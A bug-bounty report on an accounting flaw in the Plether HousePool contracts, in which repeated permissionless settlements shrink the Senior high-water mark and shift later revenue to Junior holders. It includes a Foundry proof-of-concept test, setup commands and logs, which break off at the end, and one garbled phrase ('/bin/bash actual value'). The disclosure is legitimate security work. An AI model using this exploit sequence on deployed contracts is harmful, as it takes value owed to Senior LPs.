# \#98828 [SC-High] LP can erase Senior restoration entitlement after a deficit recapitalization due to the residual recapitalization bucket being re-settled against restored Senior principal

**Submitted on Nov 10th 2026 at 12:57:12 UTC by @midkernel for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98828
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

When the owner uses the documented recovery action `CfdEngine.recapitalizePool` on a HousePool whose trader claims exceed its cash, the part of the recapitalization that pays the deficit stays in `pendingRecapitalizationAssets` with no cash behind it. Every later reconcile treats that residual as a fresh inflow and settles it against the Senior principal the recapitalization already restored. Any LP who can make `settleLpEpoch` progress (a Junior holder with a zero-value redemption request is enough) can repeat this until the Senior high-water mark is reset to a smaller value, after which pool revenue that should restore Senior principal is credited to Junior holders. While the residual exceeds pool cash it is also reserved from LP free cash, so matured Senior redemptions cannot be funded even though every remaining unit of pool cash backs Senior principal. The redemption block ends when the residual is drained or the owner adds more funds. The loss of Senior restoration priority is not reversed by any later action.

## Vulnerability Details

Affected revision: `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, files `packages/perps/src/HousePool.sol`, `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol` and `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol`. The entry point `CfdEngine.recapitalizePool` was added after the last external audit revision ([CfdEngine.sol#L632-L653](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L653)).

Expected behavior. `SECURITY.md` documents owner-funded recapitalization as the recovery action: the engine records `Recapitalization` with `CashArrived` and "the pool queues claimant allocation for normal reconciliation" ([SECURITY.md#L155-L162](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L155-L162)). `ACCOUNTING_SPEC.md` states the waterfall rules: "Losses do not reduce the Senior high-water mark", surplus is routed "first to restore Senior principal to its high-water mark, then to Junior", and reserving pending claimant buckets "prevents counting the same inflow twice" ([ACCOUNTING_SPEC.md#L332-L340](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L332-L340)).

Actual behavior, source evidence. Let `R` be the recapitalization, `D` the trader-claim deficit before it (`D < R`), and `E = R - D` the LP equity (pool cash after the claims are paid).

1. `recordClaimantInflow` adds the full `R` to `pendingRecapitalizationAssets`. Nothing reduces the bucket when `D` of that cash pays trader claims.

2. `_reconcile` caps the settleable bucket by total LP equity, which includes equity already assigned to Senior by an earlier pass ([HousePool.sol#L1829-L1834](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834), [HousePoolPendingPreviewLib.sol#L72-L82](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L72-L82)).

3. `planReconcile` subtracts the settleable amount from distributable equity before the waterfall, so the same equity is first charged as a loss against existing principal ([HousePoolReconcilePlanLib.sol#L68-L71](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71), [HousePoolReconcilePlanLib.sol#L103](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L103)):

```solidity
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
```

4. The recapitalization intent is then applied. When the loss in step 3 has reduced both principals to zero, the bootstrap branch runs again and overwrites the high-water mark with the remaining bucket, which is now smaller than the value set by the first pass ([HousePoolPendingPreviewLib.sol#L117-L122](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L122)):

```solidity
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
    remaining = 0;
}
```

Resulting sequence with no value entering or leaving the pool:

- Pass 1: Senior principal becomes `E`, the high-water mark becomes `R` (the full intent), and the bucket keeps a residual of `D`.
- Pass 2, when `D >= E`: the settleable part is `E`, the waterfall sees zero equity and charges `E` as a loss, Senior principal reaches zero, the bootstrap branch restores it to `E` and resets the high-water mark to `D`. The residual becomes `D - E`.
- Later passes drain the rest of the residual against the same principal. The high-water mark stays at the reduced value.

The Senior restoration entitlement (high-water mark minus principal) therefore falls from `D` to `D - E` although no loss occurred. The same erosion occurs when `D < E` if a Senior redemption is funded between passes, because the funded redemption lowers principal to the residual and the next pass zeroes it (second proof test).

5. The residual is also subtracted from LP free cash on every settlement ([HousePool.sol#L842-L848](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L842-L848), [HousePool.sol#L1727-L1735](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1727-L1735)). While the residual is at least the pool cash, the Senior budget is zero, `settleLpEpoch` reverts `HousePool__NoLpEpochProgress` ([HousePool.sol#L1183-L1185](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1183-L1185)), and the revert also discards the reconcile, so the state cannot advance through a Senior redemption alone.

Persisting a pass needs only a settlement that makes progress. `settleLpEpoch` is permissionless when there are no open positions, and a matured Junior redemption whose quote is zero is processed as a refund epoch, which counts as progress ([HousePool.sol#L960-L986](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L960-L986)). A holder of wiped Junior shares can therefore persist one pass per redemption request.

Failed properties. A recapitalization inflow is counted against LP equity more than once, the Senior high-water mark is reduced without a governance action, and surplus is routed to Junior while Senior is below the high-water mark the recapitalization established.

Prerequisites, all present in the proof:

- The pool has a terminal deficit: trader claims exceed pool cash. `WHITEPAPER.md` section 2.3 describes this tail state, and recapitalization is the documented recovery for it.
- The owner calls `recapitalizePool` with an amount larger than the deficit, clears degraded mode, and the claims are paid. This is the documented procedure and involves no misconfiguration.
- Senior shares exist. For the redirection, Junior shares exist.

Relation to documented behavior. The response to prior finding MED-12 says that "partial-settlement residuals stay reserved". That statement covers a reservation whose cash is still in the pool. It does not describe a residual whose cash has been paid to trader claims, its repeated settlement against existing principal, or the high-water mark reset. The release tests for recapitalization cover pools without trader claims, where the whole inflow lands in LP equity in one pass.

## Impact Details

Selected impact: "Contract fails to deliver promised returns, but doesn't lose value" (Low).

Demonstrated consequences on the pinned release (mock settlement token, 6 decimals, $0 actual value; figures are test units):

- Senior restoration priority is not delivered. In the third proof test the recapitalization is 150,000 units and the deficit 99,840 units. After the first settlement Senior principal is 50,160 and the high-water mark 150,000. Three permissionless settlements by a holder of wiped Junior shares, with no value entering or leaving the pool, leave Senior principal at 50,160 and the high-water mark at 99,840. When 99,840 units of pool value then arrive, Senior receives 49,680 and Junior holders receive 50,160. In the control run without the intermediate settlements, Senior receives all 99,840 and Junior receives nothing.
- The second proof test reaches the same outcome with ordinary Senior redemption settlements and a 300,000 unit recapitalization: 50,000 units of later value are credited 49,820 to Junior, against zero in the control.
- Senior redemptions are blocked. In the first proof test (200,000 unit recapitalization, 129,840 unit deficit) the pool holds 70,160 units, all of it projected Senior principal, with no positions, claims, pause or degraded mode. `getFreeAssets()` is zero and a matured Senior redemption cannot be funded; `settleLpEpoch` still reverts 25 hours later.

Existing Senior principal is not reduced; what is lost is the restoration that the waterfall and the recapitalization promise. The redemption block is temporary: it ends once enough settlements with progress have drained the residual, once new pool value exceeds the residual, or when the owner adds funds. No owner function clears the residual directly.

The finding requires a prior terminal deficit and an owner recapitalization. Both are documented protocol states and procedures, and the owner action is used as documented. The program lists a legitimate trusted-role action that triggers a bug harming users as in scope.

## References

- Recapitalization entry point: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L653
- Reconcile body: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1599
- Settleable bucket cap: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834
- Pre-waterfall subtraction and loss: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L103
- High-water mark reset: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L122
- Free-cash reservation: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1727-L1735
- Waterfall rules: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L332-L340
- Recapitalization routing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L639-L643
- Owner-funded recapitalization: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L155-L162
- Program: https://immunefi.com/audit-competition/plether/


## Proof of Concept

## Proof of Concept

1. HousePool reaches a terminal deficit: after a LONG and a SHORT position realize their profits at opposite ends of the price range, trader claims exceed pool cash and LP equity is zero.
2. Owner calls `CfdEngine.recapitalizePool` with an amount larger than the deficit and then `CfdEngine.clearDegradedMode`.
3. Trader calls `CfdEngine.settleTraderClaim` and is paid in full. The pool now holds the recapitalization surplus, has no positions and no claims, and is neither paused nor degraded. `pendingRecapitalizationAssets` still equals the full recapitalization.
4. Junior LP, whose shares are worth zero, calls `TrancheVault.requestRedeem` on the Junior vault for all shares and, after the epoch matures, calls `HousePool.settleLpEpoch(0, 0)`. The zero-value request is processed as a refund epoch, the settlement succeeds, and the reconcile persists: Senior principal equals the surplus, the Senior high-water mark equals the full recapitalization, and the pending bucket keeps a residual equal to the deficit.
5. Junior LP repeats step 4 from a second address. HousePool settles the residual against the Senior principal restored in step 4: the waterfall charges it as a loss, Senior principal reaches zero, the bootstrap branch restores it and resets the high-water mark to the residual amount.
6. Junior LP repeats step 4 from a third address. The residual reaches zero. Pool cash and Senior principal are unchanged since step 4, and the high-water mark is lower by the surplus amount.
7. New pool value equal to the deficit arrives. HousePool restores Senior only up to the reduced high-water mark and credits the rest to Junior principal. In the control run, where the same value arrives without steps 4 to 6, all of it restores Senior and Junior receives nothing.
8. Senior LP (separate run, larger deficit relative to the recapitalization): requests redemption of all shares after step 3. `HousePool.settleLpEpoch(0, 0)` reverts `HousePool__NoLpEpochProgress` immediately and again 25 hours later, although all pool cash is projected Senior principal.

The complete proof source is one Foundry test file.

`packages/perps/test/poc-recap-residual/RecapResidual.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

/// @notice `CfdEngine.recapitalizePool` into a pool whose LP equity was wiped by a trader-claim deficit.
/// @dev The part of the recapitalization that is consumed by the deficit stays in `pendingRecapitalizationAssets`
///      as a "residual". That residual is (a) reserved 1:1 from LP free cash although the cash no longer exists and
///      (b) re-settled against already-assigned senior principal on every later reconcile.
///      The insolvency is produced with the WHITEPAPER 2.3 sequential path (both sides realise their profit at
///      opposite ends of the price range). Engine entry uses the repo's own BasePerpTest `_open/_close` helpers.
contract RecapResidualTest is BasePerpTest {

    address internal constant TRADER_LONG = address(0xA11CE);
    address internal constant TRADER_SHORT = address(0xB0B);
    address internal constant TRADER_SMALL = address(0xC0C0);
    address internal constant SENIOR_LP = address(0x5E1107);

    address internal constant JUNIOR_ATTACKER_1 = address(0x7001);
    address internal constant JUNIOR_ATTACKER_2 = address(0x7002);
    address internal constant JUNIOR_ATTACKER_3 = address(0x7003);

    bool internal fundJuniorAttackers;

    uint256 internal constant SIZE = 200_000e18;
    uint256 internal constant MARGIN = 200_000e6;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 100_000e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        // Governance-allowed maximum (CfdEngineAdmin: maxSkewRatio <= 1e18); only lets one hedged pair fill the pool.
        params.maxSkewRatio = 1e18;
    }

    function _tick() internal {
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _log(
        string memory tag
    ) internal view {
        (uint256 sP, uint256 jP, uint256 maxS, uint256 maxJ) = pool.getPendingTrancheState();
        console2.log(tag);
        console2.log("  pool cash               ", pool.totalAssets());
        console2.log("  stored senior principal ", pool.seniorPrincipal());
        console2.log("  stored senior HWM       ", pool.seniorHighWaterMark());
        console2.log("  stored junior principal ", pool.juniorPrincipal());
        console2.log("  pending recapitalization", pool.pendingRecapitalizationAssets());
        console2.log("  unassigned              ", pool.unassignedAssets());
        console2.log("  projected senior        ", sP);
        console2.log("  projected junior        ", jP);
        console2.log("  projected max senior wd ", maxS);
        console2.log("  projected max junior wd ", maxJ);
        console2.log("  getFreeAssets           ", pool.getFreeAssets());
    }

    /// @dev Senior LP joins, a hedged pair is opened, both legs realise ~95% of max profit at opposite extremes,
    ///      the second profit becomes a trader claim larger than pool cash (terminal deficit, LPs wiped).
    ///      The owner then recapitalizes, clears degraded mode, and the claimant is paid in full.
    function _insolvencyThenRecap(
        uint256 recapAssets
    ) internal returns (uint256 deficitAssets) {
        _fundSenior(SENIOR_LP, 50_000e6);
        if (fundJuniorAttackers) {
            // Ordinary junior LP positions held before the insolvency event (three addresses of one actor).
            _fundJunior(JUNIOR_ATTACKER_1, 10_000e6);
            _fundJunior(JUNIOR_ATTACKER_2, 10_000e6);
            _fundJunior(JUNIOR_ATTACKER_3, 10_000e6);
        }
        _fundTrader(TRADER_LONG, 210_000e6);
        _fundTrader(TRADER_SHORT, 210_000e6);

        _tick();
        _open(TRADER_LONG, CfdTypes.Side.LONG, SIZE, MARGIN, 1e8);
        _tick();
        _open(TRADER_SHORT, CfdTypes.Side.SHORT, SIZE, MARGIN, 1e8);

        // Price collapses: LONG realises ~190k, paid from pool cash. SHORT stays open (fully collateralised).
        _tick();
        _close(TRADER_LONG, CfdTypes.Side.LONG, SIZE, 0.05e8);
        assertTrue(engine.degradedMode(), "close left E < L: degraded mode latched");

        // Price traverses to the other extreme: SHORT realises ~190k which the pool cannot pay => trader claim.
        _tick();
        _close(TRADER_SHORT, CfdTypes.Side.SHORT, SIZE, 1.95e8);
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        uint256 cash = pool.totalAssets();
        assertGt(claims, cash, "terminal deficit: trader claims exceed pool cash");
        deficitAssets = claims - cash;
        console2.log("deficit before recap      ", deficitAssets);

        // Documented trusted recovery (SECURITY.md 'Owner-funded recapitalization').
        settlementToken.mint(address(this), recapAssets);
        settlementToken.approve(address(engine), recapAssets);
        engine.recapitalizePool(recapAssets);
        engine.clearDegradedMode();

        vm.prank(TRADER_SHORT);
        engine.settleTraderClaim(TRADER_SHORT);

        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "all trader claims paid");
        assertFalse(engine.degradedMode(), "not degraded");
        assertFalse(pool.paused(), "not paused");
        assertFalse(pool.lpEpochSettlementPaused(), "no settlement hold");
        (uint256 longMaxProfit,,,) = engine.sides(0);
        (uint256 shortMaxProfit,,,) = engine.sides(1);
        assertEq(longMaxProfit + shortMaxProfit, 0, "no open max-profit liability");
    }

    function _requestSeniorRedeemAll() internal returns (uint256 requestId) {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        uint256 shares = seniorVault.balanceOf(SENIOR_LP);
        assertGt(shares, 0, "senior LP holds shares");
        vm.startPrank(SENIOR_LP);
        requestId = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
        vm.stopPrank();
        vm.warp(pool.lpEpochStart(requestId) + 1);
    }

    /// @notice A: after recapitalization every remaining pool dollar backs projected senior principal, there are no
    ///         positions, claims, pauses or degraded mode, yet senior redemptions cannot be funded for > 24h because
    ///         the deficit-consumed part of the recapitalization is still reserved from free cash.
    function test_A_recapResidualFreezesSeniorRedemptions() public {
        uint256 recap = 200_000e6;
        uint256 deficit = _insolvencyThenRecap(recap);
        assertGt(deficit, recap / 2, "scenario: deficit above half of the recapitalization");
        assertLt(deficit, recap, "scenario: recapitalization exceeds the deficit");

        _log("after recap + claim payment");
        uint256 cash = pool.totalAssets();
        (uint256 projectedSenior,, uint256 maxSeniorWithdraw,) = pool.getPendingTrancheState();
        assertEq(cash, recap - deficit, "pool cash is exactly the recapitalization surplus");
        assertEq(projectedSenior, cash, "all remaining cash is projected senior principal");
        assertEq(maxSeniorWithdraw, 0, "but none of it is withdrawable");
        assertEq(pool.getFreeAssets(), 0, "free cash is zero with no liabilities outstanding");

        uint256 requestId = _requestSeniorRedeemAll();
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        pool.settleLpEpoch(0, 0);

        vm.warp(vm.getBlockTimestamp() + 25 hours);
        vm.expectRevert(IHousePool.HousePool__NoLpEpochProgress.selector);
        pool.settleLpEpoch(0, 0);
        (projectedSenior,, maxSeniorWithdraw,) = pool.getPendingTrancheState();
        assertEq(projectedSenior, cash, "senior principal still fully backed by idle cash after 25h");
        assertEq(maxSeniorWithdraw, 0, "still frozen");
        assertEq(seniorVault.claimableRedeemAssets(requestId, SENIOR_LP), 0, "LP received nothing");
    }

    /// @notice B: production settlement path. Two permissionless `settleLpEpoch` calls driven by an ordinary senior
    ///         redemption, with only a tiny LP loss in between, erase the senior restoration entitlement; identical
    ///         later revenue is then credited to junior holders instead of restoring senior.
    function test_B_ordinaryRedemptionSettlementsEraseSeniorEntitlement() public {
        uint256 recap = 300_000e6;
        uint256 deficit = _insolvencyThenRecap(recap);
        assertLt(deficit, recap / 2, "scenario: free cash remains after reserving the residual");

        _requestSeniorRedeemAll();
        pool.settleLpEpoch(0, 0);
        _log("settle #1 (partial senior redemption funded)");
        uint256 seniorAfterFirst = pool.seniorPrincipal();
        uint256 hwmAfterFirst = pool.seniorHighWaterMark();
        uint256 residual = pool.pendingRecapitalizationAssets();
        assertGt(residual, 0, "residual recapitalization still pending");
        assertGt(hwmAfterFirst, seniorAfterFirst + 50_000e6, "senior is owed a large restoration");

        // Ordinary small trader profit (LP loss) between the two settlements.
        _fundTrader(TRADER_SMALL, 1000e6);
        _tick();
        _open(TRADER_SMALL, CfdTypes.Side.LONG, 10_000e18, 500e6, 1e8);
        _tick();
        _close(TRADER_SMALL, CfdTypes.Side.LONG, 10_000e18, 0.99e8);

        uint256 revenue = 50_000e6;
        uint256 snapshot = vm.snapshotState();

        // Control: revenue arrives before any further settlement => it restores senior.
        settlementToken.mint(address(pool), revenue);
        pool.accountExcess();
        (uint256 controlSenior, uint256 controlJunior,,) = pool.getPendingTrancheState();
        console2.log("control projected senior  ", controlSenior);
        console2.log("control projected junior  ", controlJunior);
        assertTrue(vm.revertToState(snapshot));

        // Finding path: one more permissionless settlement first (same LP's remaining redemption).
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        pool.settleLpEpoch(0, 0);
        _log("settle #2");
        uint256 seniorAfterSecond = pool.seniorPrincipal();
        uint256 hwmAfterSecond = pool.seniorHighWaterMark();
        assertLt(hwmAfterSecond - seniorAfterSecond, 1000e6, "senior restoration entitlement erased");

        settlementToken.mint(address(pool), revenue);
        pool.accountExcess();
        (uint256 attackSenior, uint256 attackJunior,,) = pool.getPendingTrancheState();
        console2.log("attack projected senior   ", attackSenior);
        console2.log("attack projected junior   ", attackJunior);

        assertEq(controlJunior, 0, "control: junior receives nothing while senior is impaired");
        assertGt(attackJunior, revenue - 1000e6, "attack: junior captures the revenue owed to senior");
    }

    function _juniorRequestAllAndSettle(
        address attacker
    ) internal {
        uint256 shares = juniorVault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 requestId = juniorVault.requestRedeem(shares, attacker, attacker);
        vm.warp(pool.lpEpochStart(requestId) + 1);
        // Permissionless: no open positions, so the cached-mark settlement route is open to anyone.
        vm.prank(attacker);
        pool.settleLpEpoch(0, 0);
    }

    /// @notice C: fully permissionless variant. A wiped junior LP uses zero-NAV junior redemption requests to
    ///         make `settleLpEpoch` progress three times. Each pass re-settles the residual against the senior
    ///         principal that the recapitalization just restored, until the senior high-water mark equals principal.
    ///         Revenue that the recapitalization earmarked for senior restoration is then credited to junior holders.
    function test_C_juniorHolderRedirectsSeniorRestorationToJunior() public {
        fundJuniorAttackers = true;
        uint256 recap = 150_000e6;
        uint256 deficit = _insolvencyThenRecap(recap);
        uint256 cash = pool.totalAssets();
        assertGt(deficit, recap / 2, "scenario: deficit above half of the recapitalization");
        assertEq(cash, recap - deficit, "pool cash is the recapitalization surplus");
        _log("after recap + claim payment");
        vm.warp(vm.getBlockTimestamp() + 2 hours);

        // Exactly the value the recapitalization still owes senior (HWM = recap, principal = recap - deficit).
        uint256 revenue = deficit;
        uint256 snapshot = vm.snapshotState();
        // Control: the same revenue with no intermediate settlement restores senior only.
        settlementToken.mint(address(pool), revenue);
        pool.accountExcess();
        (uint256 controlSenior, uint256 controlJunior,,) = pool.getPendingTrancheState();
        console2.log("control projected senior  ", controlSenior);
        console2.log("control projected junior  ", controlJunior);
        assertEq(controlSenior, cash + revenue, "control: all value restores senior");
        assertEq(controlJunior, 0, "control: junior receives nothing");
        assertTrue(vm.revertToState(snapshot));

        _juniorRequestAllAndSettle(JUNIOR_ATTACKER_1);
        _log("attacker settle #1");
        assertEq(pool.seniorPrincipal(), cash, "senior bootstrapped with the settleable part");
        assertEq(pool.seniorHighWaterMark(), recap, "HWM = full recapitalization intent");
        assertEq(pool.pendingRecapitalizationAssets(), deficit, "deficit-consumed part stays pending");

        _juniorRequestAllAndSettle(JUNIOR_ATTACKER_2);
        _log("attacker settle #2");
        _juniorRequestAllAndSettle(JUNIOR_ATTACKER_3);
        _log("attacker settle #3");

        assertEq(pool.totalAssets(), cash, "no value entered or left the pool");
        assertEq(pool.seniorPrincipal(), cash, "senior principal unchanged");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "residual drained without any new value");
        uint256 gapAfter = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        assertLt(gapAfter, deficit, "senior restoration entitlement shrank with no economic event");
        console2.log("senior entitlement before ", deficit);
        console2.log("senior entitlement after  ", gapAfter);

        settlementToken.mint(address(pool), revenue);
        pool.accountExcess();
        (uint256 attackSenior, uint256 attackJunior,,) = pool.getPendingTrancheState();
        console2.log("attack projected senior   ", attackSenior);
        console2.log("attack projected junior   ", attackJunior);
        assertEq(attackSenior, cash + gapAfter, "attack: senior only receives the eroded entitlement");
        assertEq(attackJunior, revenue - gapAfter, "attack: junior holders capture the rest");
        assertGt(attackJunior, 40_000e6, "attack: material redirection to junior holders");
    }

}
```

**Environment and revisions.**

> Warning: run this proof only in a disposable local checkout of the pinned release. It deploys contracts on a local in-memory EVM. Do not point it at a live network and do not use real keys.

- Affected and tested revision: `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, with unmodified production sources under `packages/perps/src`.
- Toolchain: Foundry `forge 1.8.3` (`cae51ad458f6abb64852b7709eb784352429825d`), solc `0.8.35`, the pinned `packages/perps/foundry.toml` profile (`via_ir = true`, optimizer 200 runs). A cold via-IR build takes several minutes and needs roughly 15 GB of memory.
- Topology: the test extends `BasePerpTest` from the same release, which deploys the unmodified production `CfdEngine`, `HousePool`, both `TrancheVault` instances, `MarginClearinghouse`, `OrderRouter` and `PletherOracle`. External stand-ins are the release's mock settlement token and `MockPyth`.
- Production entry points used for the finding: `CfdEngine.recapitalizePool`, `CfdEngine.clearDegradedMode`, `CfdEngine.settleTraderClaim`, `TrancheVault.requestRedeem`, `HousePool.settleLpEpoch`, `HousePool.getPendingTrancheState` and `HousePool.getFreeAssets`.

Fixture state and data, not part of the attack:

- The terminal deficit of step 1 is built with the release helpers `_open` and `_close`, which call `CfdEngine.processOrderTyped` as the Router with an explicit price (1.00, then 0.05 for the LONG close and 1.95 for the SHORT close). This follows the sequential path described in `WHITEPAPER.md` section 2.3. Reaching the deficit through `OrderRouter` and the oracle is an unverified assumption of this proof.
- `maxSkewRatio` is set to `1e18`, the maximum the admin contract accepts, so that one hedged pair fills the pool.
- Seeds are 100,000 units per tranche, the Senior LP deposits 50,000 units, the three Junior addresses deposit 10,000 units each, and the two traders hold 210,000 units each. All amounts are mock settlement tokens with 6 decimals and /bin/bash actual value.
- The arrival of new pool value in step 7 is produced by minting mock tokens to the pool and calling the owner function `HousePool.accountExcess`. It is a measuring device for the waterfall state, used identically in the control and in the finding run.
- The second test adds a small ordinary LONG round trip between settlements through the same helpers.

**Setup.**

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
cd packages/perps
mkdir -p test/poc-recap-residual
```

Save the source above as `test/poc-recap-residual/RecapResidual.t.sol` inside `packages/perps`. No production source is edited.

**Invocation.**

Run from `packages/perps`:

```bash
forge test --match-path 'test/poc-recap-residual/RecapResidual.t.sol' -vv
```

**Tests and controls.**

- `test_A_recapResidualFreezesSeniorRedemptions`: step 8. Recapitalization 200,000 units, deficit 129,840 units, pool cash 70,160 units. It asserts that projected Senior principal equals pool cash, that `getFreeAssets()` and the Senior withdrawal limit are zero, and that `settleLpEpoch` reverts `HousePool__NoLpEpochProgress` both at maturity and 25 hours later with nothing claimable.
- `test_B_ordinaryRedemptionSettlementsEraseSeniorEntitlement`: recapitalization 300,000 units. A Senior redemption is partly funded by a first settlement, and a second settlement one hour later resets the high-water mark to within 1,000 units of principal. Control (state snapshot before the second settlement): 50,000 units of new value are projected entirely to Senior. Finding run: 49,820 of the 50,000 units are projected to Junior.
- `test_C_juniorHolderRedirectsSeniorRestorationToJunior`: steps 1 to 7 with a 150,000 unit recapitalization and a 99,840 unit deficit. Control: 99,840 units of new value restore Senior to 150,000 and Junior receives zero. Finding run: three Junior refund settlements leave pool cash at 50,160, lower the high-water mark from 150,000 to 99,840, and the same 99,840 units are then projected 49,680 to Senior and 50,160 to Junior.

Each control uses the same environment, the same recapitalization and the same later inflow as its finding run and differs only in the intermediate permissionless settlements.

Evidence provenance: the logs below were recorded by running the setup and invocation above on a fresh clone of the pinned commit. The proof file has SHA-256 `236dbc4ca9bc85304c6412bb0f6770503e2dafec0fccab5b8a39ea7bad2c13c6`.

**Cleanup.**

```bash
cd ../../..
rm -rf audit-comp-plether
```

**Demonstrated scope.**

The proof establishes, from a recapitalized deficit state, a reduction of the Senior high-water mark through permissionless settlements with no change in pool value, the resulting credit of later pool value to Junior principal, and a block of fully backed Senior redemptions that lasts at least 25 hours without intervention. Existing Senior principal is unchanged throughout.

### Logs

```text
Ran 3 tests for test/poc-recap-residual/RecapResidual.t.sol:RecapResidualTest
[PASS] test_A_recapResidualFreezesSeniorRedemptions() (gas: 7053917)
Logs:
  deficit before recap       129840000000
  after recap + claim payment
    pool cash                70160000000
    stored senior principal  150000913242
    stored senior HWM        150000913242
    stored junior principal  99999086758
    pending recapitalization 200000000000
    unassigned               0
    projected senior         70160000000
    projected junior         0
    projected max senior wd  0
    projected max junior wd  0
    getFreeAssets            0
[PASS] test_B_ordinaryRedemptionSettlementsEraseSeniorEntitlement() (gas: 9397197)
Logs:
  deficit before recap       129840000000
  settle #1 (partial senior redemption funded)
    pool cash                129840000000
    stored senior principal  129840000000
    stored senior HWM        228913963329
    stored junior principal  0
    pending recapitalization 129840000000
    unassigned               0
    projected senior         129840000000
    projected junior         0
    projected max senior wd  129840000000
    projected max junior wd  0
    getFreeAssets            0
  control projected senior   179743960001
  control projected junior   0
  settle #2
    pool cash                113356435818
    stored senior principal  113356435818
    stored senior HWM        113440345328
    stored junior principal  0
    pending recapitalization 96039999
    unassigned               0
    projected senior         113356435818
    projected junior         0
    projected max senior wd  113356435818
    projected max junior wd  0
    getFreeAssets            113260395819
  attack projected senior    113440345328
  attack projected junior    49820050491
[PASS] test_C_juniorHolderRedirectsSeniorRestorationToJunior() (gas: 13637926)
Logs:
  deficit before recap       99840000000
  after recap + claim payment
    pool cash                50160000000
    stored senior principal  150005022892
    stored senior HWM        150005022892
    stored junior principal  129994977108
    pending recapitalization 150000000000
    unassigned               0
    projected senior         50160000000
